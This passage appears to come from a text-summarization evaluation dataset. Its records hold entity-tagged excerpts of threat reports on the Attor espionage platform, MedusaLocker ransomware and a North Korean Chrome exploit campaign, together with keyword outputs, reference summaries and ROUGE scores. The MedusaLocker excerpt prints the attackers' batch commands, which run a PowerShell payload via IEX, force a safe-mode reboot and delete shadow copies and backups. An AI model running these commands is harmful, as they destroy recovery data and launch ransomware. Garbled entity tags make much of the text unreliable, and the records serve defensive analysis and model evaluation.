a module ID or an object ID)Global\\{6A2B597F-1C2F-4f78 - AC94 - 7E1C8F136B0F } Global\\{3B68B0E9 - 08C4 - 4f23 - B84C - CD76CCC4D362 } Global\\{E5C403BC-555E-4162 - 8F18 - EFF27A6957C1 } Global\\{DC006092 - 9E86 - 4c20 - 8601 - F643AF574444 } Global\\{C4AE71DA - D55C-4a41 - 9F86 - 9F97D3CD47D9 } Global\\{7D715AC5 - B909 - 4aaf-90C9 - 882CC4423F8C } Global\\{377142C5 - B7BD-42da - A8B3 - 4CAD9DA53326 } Global\\{343D67FA-567D-415e-9FAE-622153EFE241 } Global\\{144DB9C5 - A3B7 - 4eab - AD9A-0E80B3FF7853 } Global\\{7BD3390E-05C1 - 43a0 - B938 - 94F52C3F3D32 } Global\\Root#SYSTEM#0000#{43850F15 - CB8E-4a88 - 9BA0 - F11FB0xxA2xx } { 770F45C0 - D879 - 4d4d-9F03 - 3AC9F2CA4ECB } { 69DB17B0 - 4DA5 - 43b6 - 8A63 - 76B483AE7D5A } [ HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A7F7DE86 - C5BF-4239 - A220 - BF7523F5501E } ] [ HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A8F7DE86 - C5BF-4239 - A220 - BF7523F5501E } ] [ HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A7E7DE86 - C5BF-4239 - A220 - BF7523F5501E } ] [ HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A8E7DE86 - C5BF-4239 - A220 - BF7523F5501E}]Service display names [PERSON] Adobe [PERSON] Acrobat [PERSON] Update v3 .17 .lkws [ORG] Adobe [ORG] Acrobat [ORG] Update [ORG] Service v3 .2 .muitnl [ORG] Microsoft .NET Framework NGEN v3 .5 .10549_X64_86 [ORG] Microsoft .NET Framework NGEN v4 .0_X64_86 [ORG] Microsoft .NET [PERSON] Framework [PERSON] NGEN [PERSON] v3 .5 .10549_X64_86 [ORG] Microsoft .NET [PERSON] Framework [PERSON] NGEN [PERSON] v3 .5 .10549_X64_86 [ORG] Microsoft .NET [PERSON] Framework [PERSON] NGEN [PERSON] v3 .5 .10549_X64_8625Cryptographic keysXOR cipher keys BEB05E4C303A65902E57A2C570465BD3993E5BCBB295BCF06AD167997A175247RSA public keys -----BEGIN PUBLIC KEY----- tF174pGFl7+ycxbCILAOZiHeCoEmk0463WJaLaNq27nQYSo4tCmdHy8DOH / ZYPwH cNM/8TsHFJjYsagVgrZXGdjdT78nxDDAORy5ey2Fb6tovVdT5oFGn3fJLcpyRzQK [DATE] 0QL4 / GeLis53IC8tlflGjnChT2R5rbecKk1d4b+AkhawwmOgsCsZJtgh+MpSyVAH -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+wyxqkGYGSrU6wbMz5y I2FfwmsFM8MbhU/73LSo / U0TYcecX7CGtT+yi+aG0Bddox4GKFebPYHqnOr0fVaB FxfjyDx359qgrtfbeGH4qUlVCheHWt890urb8m5SntqGN3m1PniK5u7Vvg8vvihw 20Z / FXUPjzvf99w45FeBSSj / FoOp7wHGA+HLArbpfRHHadj6MaxrCGqCXJZHFLYy -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFYkoqZrdAm4zDI / hYT5 [LOC] p2WfqOSzrD+bdr6VuZYYa1CInG1xciAwAZcDZi+wB8bFoCWIsVf7v6d6eTJ84DO8 [LOC] e8av4RKt26mXwWglm0znmWuGEGsrsmbBNjWJgl5jI2qb0hcMtLPc4LV / ngz8KWbE qxwPfnFYrhhYgCgFjWbJ1A8azRyOYWLo7qhFYeO+Fmvb480/9lZ4hYEhPRzKL3nW -----END PUBLIC KEY-----26 - ----BEGIN PUBLIC KEY----- -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvg5VRwJbmGuWCjGKBJFE [PERSON] KBGdvXxdak4HnUzf+YiQmeqCeJVeR0fimcpf+Mvs1kKMT6LEpqzI3GknQca8V0Y+ [PERSON] vHe22NOZYqAVmHVZWgtg9Le2tOCqBLaTeRHO3SejzT3fwxcWshpvOM1QSXx6WP5V [PERSON] OlNw3XqOM7D1t / [PERSON] MZwo4hi+RaqQPgPLWXigtqDoQuuv / tP7vGOiKfVpjv6oQ4AlAX yTauktpktB4Q51nmm3hxy / pET2WjXpwPOXrl+Cpny5lZC44KRKvX8yume97zXZpg gf8rebKSvwipIIRVeD0ihpazjQ9V8AzPSYpbmk8oF8TUB / hFyYWQRq8+hKZ6IlKC [DATE] wwIDAQAB -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- x1cUWFcN2mSKCMHeJpdBPCEM7CwBjGjp9euSG+ZpvpOobvv / eggUVa68wm2HfNAk + WkpR / XKyOCBOQ7UzU7nHXka7MmdDLNuKrH+CSMGEK1VIuz6CjMPJkAwGpL1r1g3 a7nr4ihoLO2+r / dZUXgf7oyPLQdUiPH4I8eCzJVCMLi7kD7AqHvyOF / F9yYJ9DKO LEZrxG5wDnTKM+3Iwti6ULqCQwd / krlcSZkm+kwxN5htMwk2chmEONS6y7fwcMLW [PERSON] LwIDAQAB -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4rdRiBiEW7RKi+nGuQkQ zzy6B5M1patDsz8CplezC5ML4TGVjzU1IVpe / qzVoaYoDH5snjRuzcTWc4+BZlE3 wnzK / EItumjT9wuMcngHggG1T5hjgZQoLjVhAJ8zyNOmcVNsL9 / [ORG] DSUf1zg5SdGjv DV5 / xFQGFeKegFKcZLukKA3et8y92NS2KLzQj3SIJVxFrSOK+rGfwy0pkr6qW00a [ORG] TQIDAQAB -----END PUBLIC KEY-----27Applications targeted by [PERSON] Screengrabber pluginProcess name substrings : [ORG] & RQ , 7ZFM , [DATE] 7ZG , [ORG] AGENTVKONTAKTE , [ORG] AVANT , [ORG] BROSIX , BROWSER , CHEAPVOIP , [ORG] CHROME , DRAGON , [ORG] EXCEL , [ORG] FACEBOOKVIDEOCALLING , [ORG] FINEREADER , [ORG] FIREFOX , [ORG] FIREFOXPORTABLE , FLOCK , [ORG] GAJIM , [ORG] GGAPP , HAMSTERARC , [ORG] ICQ , [GPE] IEXPLORE , [ORG] INFIUM , [ORG] LF30 , [ORG] MAGENT , [ORG] MAXTHON , MIRANDA32 , MOZILLA , [ORG] MSIMN , MSMSGS , [ORG] MSNMSGR , [ORG] MULTIFON , MYIE , [ORG] NERO , [ORG] NICHROME , [ORG] NIMBUZZ , [ORG] NONOH , [GPE] NOTEPAD , [GPE] NOTEPAD++ , OOVOO , [ORG] OPERA , OUTLOOK , PGPKEYS , PGPTOOLS , PIDGIN , PIDGIN - PORTABLE , [ORG] POWERPNT , [ORG] PSI , PUFF , [ORG] QIP , QQ , QUTIM , [ORG] R&Q , [ORG] RUN , [ORG] SAFARI , SEAMONKEY , [ORG] SKYPE , TBB - [ORG] FIREFOX , [ORG] TEAMVIEWER , THEBAT , [ORG] THUNDERBIRD , [DATE] TRILLIAN , [PERSON] TRUECRYPT , [ORG] TWEETDECK , TWITTER - WIN8 , VIBER , VISIO , [GPE] W8VK , WEBMONEY , [PERSON] WINMAIL , WINRAR , WINWORD , WINZIP32 , [ORG] WLMAIL , WORDPAD , [ORG] WUALA , [ORG] WWAHOST , X - LITE , [ORG] YAHOOM , [NORP] YAHOOMESSENGERWindow title substrings : * * * * * * * * * * * * , [ORG] AOL [ORG] MAIL , [GPE] ATTACHMENT .GOOGLE , [ORG] BLOGGER , [ORG] BLOGSPOT , DEPOSIT [PERSON] FILES , FACEBOOK , FROMRU , [PERSON] GMAIL , GOOGLE+ , HIDE MY ASS ! , HIDEMYASS .COM , HOTBOX , [ORG] HOTMAIL , [ORG] HUSHMAIL , IMO , [ORG] LIVEJOURNAL , MAIL .RU , MAIL .YANDEX , [ORG] MESSENGER , [ORG] MICROSOFT EXCEL WEB [ORG] APP , [ORG] MICROSOFT ONENOTE WEB APP , [ORG] MICROSOFT [ORG] POWERPOINT WEB [ORG] APP , [ORG] MICROSOFT WORD WEB APP , [ORG] MSN , [ORG] POCHTA , [ORG] RAMBLER , [ORG] RAPIDSHARE , SKYDRIVE , [ORG] SKYPE , [ORG] TURBOBIT , TWITTER , WEBMAIL , YAHOO ! MAIL , \u0412\u0410\u041c [ORG] \u0421\u041e\u041e\u0411\u0429\u0415\u041d\u0418\u0415 , [ORG] \u041e\u0414\u041d\u041e\u041a\u041b\u0410\u0421\u0421\u041d\u0418\u041a\u0418 , \u041f\u0420\u0418\u0413\u041b\u0410\u0428\u0415\u041d\u0418\u0415 \u0414\u0420\u0423\u0416\u0418\u0422\u042c , \u042f\u041d\u0414\u0415\u041a\u0421 .\u041f\u041e\u0427\u0422\u04107 MITRE ATT&CK TECHNIQUESTacticIDNameDescriptionT1106Execution through APIAttor \u2019s dispatcher uses CreateProcessW API for execution .T1129Execution through [PERSON] Module LoadAttor \u2019s dispatcher executes additional plugins by loading the respective DLLs .ExecutionT1085Rundll32Plugin [CARDINAL] 0x10 schedules rundll32.exe to load the dispatcher .T1053Scheduled TaskPlugin [CARDINAL] 0x10 schedules rundll32.exe to be executed on each boot / logon , and subsequently to load the dispatcher .T1035Service ExecutionAttor \u2019s dispatcher can be executed as a service .T1037Logon ScriptsPersistenceT1050New ServiceAttor \u2019s dispatcher can establish persistence via adding a Registry key with a logon script : HKEY_CURRENT_USER\\Environment\u201cUserInitMprLogonScript\u201dAttor \u2019s dispatcher can establish persistence by registering a new service .HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\ Minimal registry keys are updated to execute the service even in Safe mode and Safe mode with networking .T1053Scheduled TaskPlugin 0x10 schedules a new task that loads the dispatcher on boot / logon .28TacticIDNameDescriptionDefense EvasionT1140Deobfuscate / Decode [PERSON] Files or [ORG] InformationStrings are encrypted with a XOR cipher , using a hardcoded key .Configuration data , log files and plugins are encrypted using a hybrid encryption scheme \u2013 [NORP] Blowfish - [ORG] OFB combined with [ORG] RSA .T1107File [ORG] DeletionThe collected files and log files are deleted after exfiltration by plugin [CARDINAL] 0x05 .T1158Hidden [PERSON] Files and [ORG] DirectoriesThe attributes of log files and directories are set to [ORG] HIDDEN / SYSTEM/ ARCHIVE ( or combination of those ) .T1036MasqueradingAttor \u2019s dispatcher disguises itself as a legitimate task ( i .e . , the task name and description appear legitimate ) .T1112Modify RegistryAttor \u2019s dispatcher can modify the [PERSON] Run registry key .T1055Process InjectionT1108Redundant AccessT1099TimestompT1497Virtualization / Sandbox EvasionAttor \u2019s dispatcher injects itself into running processes , to gain higher privileges and to evade detection . It avoids specific system and [NORP] Symantec processes .Both 32 - bit and [CARDINAL] 64 - bit versions of Attor \u2019s dispatcher are executed ; also they are injected into almost all processes .There is a watchdog component , implemented in the dispatcher or as a separate plugin , that reinstalls Attor if it has been removed .The time of last access to files and registry keys is manipulated after they have been created / modified .Attor can detect whether it is executed in some virtualized or emulated environments . If detected , it terminates itself immediately .Credential AccessT1056Input [PRODUCT] CaptureUser credentials can be collected by plugin [GPE] 0x07 via capturing keystrokes .T1083File and Directory DiscoveryDiscoveryT1120Peripheral Device DiscoveryPlugin [CARDINAL] 0x01 enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files .Plugin [CARDINAL] 0x01 collects information about inserted storage devices , modems and phone devices .T1082System Information DiscoveryAttor monitors the free disk space on the system .T1123Audio CapturePlugin 0x03 is capable of recording audio using available input sound devices .T1119Automated [ORG] CollectionAttor automatically collects data about the compromised system .T1115Clipboard DataCollectionPlugin [DATE] 0x07 collects data stored in the Windows clipboard by using the [ORG] OpenClipboard and GetClipboardData APIs .T1074Data StagedCollected data is staged in a central upload directory prior to exfiltration .T1056Input [ORG] CapturePlugin 0x07 captures keystrokes pressed within the window of the process where Attor is injected .T1113Screen [ORG] CapturePlugin 0x02 captures screenshots of target applications .29TacticIDNameDescriptionT1043Commonly Used [ORG] PortAttor uses port [CARDINAL] 21 for [ORG] C&C communication .T1188Multi - hop [ORG] ProxyAttor uses Tor for [ORG] C&C communication .Command and ControlT1079Multilayer [PRODUCT] EncryptionAttor sends encrypted traffic using [ORG] Tor , which itself uses multiple layers of encryption .T1105Remote File CopyAttor can download additional plugins , updates and other files .T1071Standard Application Layer ProtocolFTP protocol is used for [ORG] C&C communication .T1032Standard Cryptographic ProtocolA combination of [NORP] Blowfish - OFB and [ORG] RSA is used for data encryption .T1020Automated ExfiltrationExfiltration of the collected data and log files is done automatically by plugin [CARDINAL] 0x05 .ExfiltrationT1022Data EncryptedAttor encrypts data with a combination of [NORP] Blowfish and [ORG] RSA ciphers before sending it to the [ORG] C&C server .T1041Exfiltration [ORG] Over [ORG] Command and [ORG] Control [ORG] ChannelAttor exfiltrates data over the [ORG] C&C channel .ABOUT ESET For [DATE] 30 [DATE] years , ESET \u00ae has been developing industry - leading IT security software and services for businesses and consumers worldwide . With solutions ranging from endpoint and mobile security , to encryption and [CARDINAL] two - factor authentication , ESET \u2019s high - performing , easy - to - use products give consumers and businesses the peace of mind to enjoy the full potential of their technology . ESET unobtrusively protects and monitors [CARDINAL] 24/7 , updating defenses in real time to keep users safe and businesses running without interruption . Evolving threats require an evolving IT security company . Backed by R&D centers worldwide , ESET becomes the [ORDINAL] first IT security company to earn 100 Virus Bulletin VB100 awards , identifying every single \u201c in - the - wild \u201d malware without interruption since [DATE] 2003 . For more information , visit www .eset .com or follow us on [GPE] LinkedIn , Facebook and Twitter .", "generated_text": "ESET researchers; at least 2013; diplomatic missions; governmental institutions; Eastern Europe; the malware; the attackers; GSM/GPRS modem; Android; IP; IP; the plugins; persistence; code; persistence; the full set; data; IMEI; the IMEI value; MSISDN; data spoofing; Windows APIs; indicators; compromise; the platform; victims; data exfiltration; network communication; HTTP; a URL; the command; the EXE; a C&C server; an onion domain; the Tor protocol; the server; the data; a mask; the C&C server; the domain; IP; GSM/GPRS modem; SMS messages; a keylogger; the C&C server; the plugin; the code; the C&C server; IP addresses; the victims; the same number; the attacks; the time; the threat actor; the threat actor; the networks.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF describes a sophisticated cyberespionage malware platform called Attor that has been active since at least 2013. Attor uses a modular architecture consisting of a main dispatcher DLL and numerous loadable plugins that provide various capabilities. The plugins are customized for individual targets and synchronized using shared folders. It uses TOR for command and control communication to remain anonymous and untraceable. Network functionality is distributed across multiple components to make analysis difficult. Attor has plugins for persistence, device monitoring, screen/audio capturing, keylogging, file collection, exfiltration etc. A notable plugin fingerprints GSM devices using AT commands to gather subscriber details. The malware employs various encryption schemes and anti-analysis techniques. It avoids suspicious processes and restores file timestamps to stay undetected. Attor has targeted diplomatic missions and governments mainly in Russia and Eastern Europe. Infection vectors are unknown but it can monitor browsers, emails, messaging apps indicating spearphishing. The report provides in-depth technical analysis of the dispatcher component and the various plugins. It outlines Attor's evasion capabilities, command and control communication, and custom encryption schemes. Indicators of compromise and MITRE ATT&CK techniques are provided. The report concludes Attor is a professionally developed, customizable malware platform for long term infiltration of high-value targets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44278606965174133, "gpt3/lexical/rouge_rouge2": 0.12999999999999998, "gpt3/lexical/rouge_rougeL": 0.21890547263681595, "gpt3/lexical/rouge_rougeLsum": 0.21890547263681595, "gpt3_generated_text": ["ESET researchers have discovered a cyberespionage platform called Attor that has been used in targeted attacks since at least 2013. The platform specifically targets diplomatic missions and governmental institutions, with a focus on Russian-speaking users. Attor's most notable feature is its ability to detect connected GSM/GPRS modems or mobile devices and collect sensitive information such as IMEI, IMSI, and MSISDN numbers. The platform utilizes a complex modular architecture and utilizes Tor for network communication to ensure anonymity and untraceability. The malware has been active in two waves, with different implementations and substantial changes in architecture. The exact distribution method and timeline of the operation are unknown. The platform's plugins provide various spying capabilities, including persistence, exfiltration channels, and C&C communication. The platform uses the AT protocol and Tor for network communication, hence the name Attor. The malware has been used to target a few dozen victims, primarily located in Russia and Eastern Europe. The timestamps on the samples suggest that the older version was used between 2013 and 2017, while the updated version has been in use since 2018."]}, {"split_name": "val", "sample_id": "val_16", "prompt_text": "Extract the keywords: [PERSON] Cybereason vs. [LAW] MedusaLocker [LAW] Ransomwarecybereason.com/blog/medusalocker-ransomwareBack to [PERSON] Blog [PERSON] Cybereason Nocturnus Nov 19 , [DATE] 2020Research by : [PERSON] Tom [PERSON] Fakterman and [PERSON] Assaf [PERSON] DahanBackgroundThe [PERSON] MedusaLocker ransomware [ORDINAL] first emerged in [DATE] September [DATE] 2019 , infecting and encrypting Windows machines around the world . There have been reports of [ORG] MedusaLocker attacks across multiple industries , especially the healthcare industry which suffered a great deal of ransomware attacks during the [PRODUCT] COVID-19 pandemic . In order to maximize the chances of successful encryption of the files on the compromised machine , [ORG] MedusaLocker restarts the machine in safe mode before execution . This method is used to avoid security tools that might not run when the computer starts in safe mode . MedusaLocker avoids encrypting executable files , most likely to avoid rendering the targeted system unusable for paying the ransom . To make it even more dangerous , [ORG] MedusaLocker uses a combination of [ORG] AES and [GPE] RSA-2048 , making the procedure of brute forcing the encryption practically impossible . Recently , there have been reports stating that [ORG] AKO , a variant of [ORG] MedusaLocker , added an element of blackmail , threatening to release stolen files publicly . This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by [ORG] Cybereason [DATE] earlier [DATE] this [DATE] year . Although data leak extortion threats have been found in some of [ORG] MedusaLocker \u2019s ransom notes , [PERSON] Cybereason did not observe evidence of information actually being exfiltrated by the [ORG] MedusaLocker ransomware at the time of this research . [ORG] Cybereason [ORG] Blocks [ORG] MedusaLocker [PERSON] RansomwareKey [PERSON] Points1 . High Severity : [ORG] The [ORG] Cybereason [ORG] Nocturnus [ORG] Team assesses the threat level as HIGH given the destructive potential of attack.2 . Encrypting mapped drives : MedusaLocker encrypts shared network drives of adjacent machines on the network.3 . Attempted extortion : The ransom note left by new [ORG] MedusaLocker variants contains threats to publicly reveal stolen data if payments are not made.4 . Detected and Prevented : Cybereason \u2019s platform fully detects and prevents the [ORG] MedusaLocker ransomware . [PERSON] Breaking [PERSON] Down the AttackMany MedusaLocker infections typically start with [CARDINAL] two files , a \u2018 batch \u2019 file and a powershell script saved as a \u2018 txt \u2019 file : qzy.bat qzy.txtContents of the [PERSON] Batch fileThe qzy.bat file deployed by the attackers is designed to create persistence via [ORG] a [ORG] Windows [ORG] Service . The service does the following tasks:1 . Executes a [ORG] Powershell script that resides in C:\\Windows\\SysWOW6\\qzy.txt , which contains the Ransomware payload.2 . Changes registry keys to allow the service to run in safe mode.3 . Enforce restart in safe mode.4 . Restart the infected host.sc create purebackup [PERCENT] binpath= \" [PERCENT] % COMSPEC% /C start /b C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe -c $ km = [ IO.File]::ReadAllText('C:\\Windows\\SysWOW64\\qzy.txt ' ) ; [ORG] IEX $ km \" start= auto [NORP] DisplayName= \" purebackup\"reg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /freg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /ve /d \\\"Service\\ \" /fbcdedit /set { default } safeboot minimalshutdown /r /f /t [PERCENT] 00 [PERCENT] & [PERCENT] del [PERCENT] % 0The batch file execution portrayed in [GPE] Cybereason attack tree:1/7MedusaLocker [PERSON] Batch file executionAfter the machine is restarted in safe mode , the created service executes and the powershell script runs . This powershell script is a [ORG] PowerSploit script known as \u201c [ORG] Invoke - ReflectivePEInjection \u201d . The script reflectively loads the [ORG] MedusaLocker ransomware to the powershell process memory . The [ORG] MedusaLocker binary encoded with base64 in the script : Powershell script snippetMutex [ORG] DetectionThe first thing MedusaLocker does is to check if a process with the mutex \u201c { [CARDINAL] 8761ABBD-7F85 - 42EE - B272 - A76179687C63 } \u201d exists on the machine . If the mutex already exists , the ransomware will stop its execution . CMSTP UAC BYPASS / Privilege EscalationMedusaLocker uses a known [ORG] UAC bypass technique also used by other malware such as [PERSON] Trickbot that allows the ransomware to run with escalated privileges that enable it to carry out administrative operations . It achieves privilege escalation by leveraging the built - in Windows tool CMSTP.exe to [ORG] Bypass [ORG] User [ORG] Account [ORG] Control and execute arbitrary commands from a malicious [ORG] INF through an auto - elevated COM interface . An \u201c % AppData%\\Roaming\\svchostt.exe \u201d ( depends on the malware variant ) . And then , creates persistence by a scheduled task named \u201c svhost \u201d which executes [TIME] every [TIME] 15 [TIME] minutes : Scheduled task in [ORG] CybereasonBypassing [ORG] Security [ORG] ProductsMedusaLocker will attempt to disable or terminate certain process and security products : wxServer.exe , wxServerView , sqlservr.exe , sqlmangr.exe , [ORG] RAgui.exe , supervise.exe , [ORG] Culture.exe , RTVscan.exe , [ORG] Defwatch.exe , sqlbrowser.exe , winword.exe , QBW32.exe , QBDBMgr.exe , qbupdate.exe , QBCFMonitorService.exe , axlbridge.exe , QBIDPService.exe , httpd.exe , fdlauncher.exe , MsDtSrvr.exe , tomcat6.exe , java.exe,360se.exe,360doctor.exe , wdswfsafe.exe , fdlauncher.exe , fdhost.exe , [NORP] GDscan.exe , [NORP] ZhuDongFangYu.exeIn addition , it will attempt to disable the following services : wrapper , [ORG] DefWatch , ccEvtMgr , ccSetMgr , [ORG] SavRoam , sqlservr , sqlagent , sqladhlp , [GPE] Culserver , [NORP] RTVscan , sqlbrowser , [PERSON] SQLADHLP , [ORG] QBIDPService , [ORG] Intuit . QuickBooks . FCS , [GPE] QBCFMonitorService , sqlwriter , msmdsrv , tomcat6,zhudongfangyu , [PERSON] SQLADHLP , vmware- usbarbitator64,vmware - converter , dbsrv12,dbeng8Deleting Backups and Preventing RecoveryMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts : Hardcoded commands in [ORG] the [ORG] malwareCommandPurposevssadmin.exe [ORG] Delete [ORG] Shadows /All /QuietDeleting all shadow copy volumesbcdedit.exe /set { default } recoveryenabled [ORG] NoDisabling [ORG] Automatic Startup Repairbcdedit.exe /set { default } bootstatuspolicy ignoreallfailuresDisabling Windows Error Recovery on startupwbadmin DELETE SYSTEMSTATEBACKUPDeleting backup for [PERSON] Windows [PERSON] Serverwbadmin [PERSON] DELETE [PERSON] SYSTEMSTATEBACKUP -deleteOldestDeleting the oldest backup on [PRODUCT] Windows [PRODUCT] ServerMedusaLocker execution in the memory of powersehll.exe:3/7MedusaLocker execution from [ORG] PowershellScanning [ORG] and [ORG] Propagating [ORG] to [ORG] Remote [ORG] MachinesAfter a successful infection , the [ORG] MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders . The ransomware edits the value \u201c EnableLinkedConnections \u201d of the following registry key : HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Policies\\System\u201cEnableLinkedConnections \u201d value is changedIt does that so it can connect to other adjacent hosts residing on the same network , and in addition , tries to ping the entire subnet to see which hosts are alive : Ping sweep to find live hostsEncryption Whitelist FoldersMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach , and encrypts files in most folders with the exception of:%User Profile%\\AppData\\ProgramData\\Program Files\\Program Files ( x86)\\AppData\\Application Data\\intel\\nvidia\\Users\\All Users\\WindowsRansom NoteAlthough the ransom note of [ORG] MeduzaLocker states that data has been exfiltrated , we have not observed indications of such behavior at the moment by [ORG] the [ORG] malware:4/7Ransom [ORG] noteCybereason [ORG] Detection and [ORG] PreventionCybereason is able to both detect and prevent the execution of [ORG] MedusaLocker using the powershell protection component : Malicious powershell script preventedAdditionally , when the Anti - Ransomware feature is enabled , behavioral detection techniques in the platform are able to detect the deletion of the shadow copies using vssadmin.exe , which will create a Malop for the ransomware behaviour : Ransomware preventedMitre [PERSON] Att&ck BreakdownExecutionPersistencePrivilege [ORG] EscalationDefense [ORG] EvasionLateral MovementImpactWindows Command [ORG] ShellWindows ServiceBypass User Access ControlDynamic - link [PERSON] Library InjectionSMB / Windows Admin SharesData Encrypted for Impact5/7PowershellScheduled", "generated_text": "Cybereason; the ransomware; the attackers; Microsoft; the malware; mapped drives; the ransom note; blackmail; stolen data; the ransom note; a Windows Service; persistence; a Powershell script; PowerShell scripts; a Windows Service; the ransom note; stealth; files; encrypting; network drives; ransom note; the threat level; threat; high; The malware; analysis; the threat; tactics.", "ref_text": "<START-1>The document analyzes the MedusaLocker ransomware which first emerged in September 2019 and has targeted organizations across industries, including healthcare. MedusaLocker uses various techniques to maximize chances of successful encryption: Restarts machine in safe mode to avoid security products. Avoids encrypting executables to maintain system operability. Uses AES and RSA-2048 encryption. Threatens data leak extortion in ransom notes It uses a batch script and PowerShell loader to gain persistence and elevation. It terminates processes and disables services of security products. It deletes backups and shadow copies to prevent recovery. After infecting a system, it scans the subnet for other machines and shares to propagate. The ransomware avoids encrypting certain whitelist folders. It leaves a ransom note threatening data leak extortion but no exfiltration was observed. Detection and prevention of the ransomware is demonstrated using Cybereason's Anti-Ransomware feature and Powershell protection. The Mitre ATT&CK framework is used to map the ransomware's tactics. Indicators of Compromise and hashes for the ransomware executables, batch script, and PowerShell loader are provided. The threat level is assessed as high due to the ransomware's destructive potential. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49, "gpt3/lexical/rouge_rouge2": 0.1306532663316583, "gpt3/lexical/rouge_rougeL": 0.25999999999999995, "gpt3/lexical/rouge_rougeLsum": 0.25999999999999995, "gpt3_generated_text": ["This article discusses the MedusaLocker ransomware, its attack methods, and the efforts made by Cybereason to block and prevent it. MedusaLocker is a destructive ransomware that emerged in September 2019 and has since targeted Windows machines worldwide, particularly in the healthcare industry during the COVID-19 pandemic. One of its tactics is to restart the compromised machine in safe mode to avoid detection by security tools. The ransomware encrypts files on the compromised machine using a combination of AES and RSA-2048 encryption, making it nearly impossible to brute force. Recently, a variant of MedusaLocker called AKO has added an element of blackmail by threatening to release stolen files publicly. However, Cybereason did not observe evidence of data exfiltration in their research. The article highlights the high severity of the threat posed by MedusaLocker, its ability to encrypt mapped network drives, and the attempted extortion through ransom notes. Cybereason's platform is capable of detecting and preventing MedusaLocker ransomware attacks. The article also provides a breakdown of the attack process, including the execution of a batch file that creates persistence through a Windows Service and runs a PowerShell script containing the ransomware payload. Overall, this article provides a comprehensive analysis of the MedusaLocker ransomware and the countermeasures taken by Cybereason to protect against it."]}, {"split_name": "val", "sample_id": "val_17", "prompt_text": "Extract the keywords: Countering threats from [LOC] North [LOC] Koreablog.google/threat-analysis-group/countering-threats-north-korea/Mar [CARDINAL] 24 , [CARDINAL] 2022Adam WeidemannOn [DATE] February [DATE] 10 , [ORG] Threat [ORG] Analysis [ORG] Group discovered [CARDINAL] two distinct [NORP] North [NORP] Korean government - backed attacker groups exploiting a remote code execution vulnerability in [GPE] Chrome , CVE-2022 [ORG] - 0609 . These groups ' activity has been publicly tracked as Operation Dream Job and Operation AppleJeus . We observed the campaigns targeting [GPE] U.S. based organizations spanning news media , IT , cryptocurrency and fintech industries . However , other organizations and countries may have been targeted . [CARDINAL] One of the campaigns has direct infrastructure overlap with a campaign targeting security researchers which we reported on [DATE] last [DATE] year . The exploit was patched on [DATE] February [DATE] 14 , [DATE] 2022 . The earliest evidence we have of this exploit kit being actively deployed is [DATE] January [DATE] 4 , [CARDINAL] 2022.We suspect that these groups work for the same entity with a shared supply chain , hence the use of the same exploit kit , but each operate with a different mission set and deploy different techniques . It is possible that other [NORP] North [NORP] Korean government - backed attackers have access to the same exploit kit . In this blog , we will walk through the observed tactics , techniques and procedures , share relevant IOCs and analyze the exploit kit used by the attackers . In line with our current disclosure policy , we are providing these details [DATE] 30 [DATE] days after the patch release . Campaign targeting news media and IT companiesThe campaign , consistent with [ORG] Operation [ORG] Dream [ORG] Job , targeted over [CARDINAL] 250 individuals working for [CARDINAL] 10 different news media , domain registrars , web hosting providers and software vendors . The targets received emails claiming to come from recruiters at [ORG] Disney , Google and Oracle with fake potential job opportunities . The emails contained links spoofing legitimate job hunting websites like Indeed and ZipRecruiter.1/4Example of spoofed job hunting websitesVictims who clicked on the links would be served a hidden iframe that would trigger the exploit kit . Attacker [ORG] - Owned [ORG] Fake [ORG] Job [ORG] Domains : disneycareers[.]net find - dreamjob[.]com ziprecruiters[.]orgExploitation URLs : https[:]//colasprint[.]com / about / about.asp ( legitimate but compromised website ) https[:]//varietyjob[.]com / sitemap / sitemap.aspCampaign targeting cryptocurrency and Fintech organizations Another [NORP] North [NORP] Korean group , whose activity has been publicly tracked as [EVENT] Operation [EVENT] AppleJeus , targeted over [CARDINAL] 85 users in cryptocurrency and fintech industries leveraging the same exploit kit . This included compromising [CARDINAL] at [CARDINAL] least [CARDINAL] two legitimate fintech company websites and hosting hidden iframes to serve the exploit kit to visitors . In other cases , we observed fake websites \u2014 already set up to distribute trojanized cryptocurrency applications \u2014 hosting iframes and pointing their visitors to the exploit kit.2/4Attacker - Owned Websites : blockchainnews[.]vip chainnews - star[.]com teenbeanjs[.]comCompromised [ORG] Websites ( [ORG] Feb [ORG] 7 [ORG] - [ORG] Feb [ORG] 9):www.options - it[.]com www.tradingtechnologies[.]comExploitation URLs : https[:]//financialtimes365[.]com / user / finance.asp https[:]//gatexpiring[.]com / gate / index.asp https[:]//humingbot[.]io / cdn / js.asp https[:]//teenbeanjs[.]com / cloud / javascript.aspExploit kit overview The attackers made use of an exploit kit that contained multiple stages and components in order to exploit targeted users . The attackers placed links to the exploit kit within hidden iframes , which they embedded on both websites they owned as well as some3/4websites they compromised . The kit initially serves some heavily obfuscated javascript used to fingerprint the target system . This 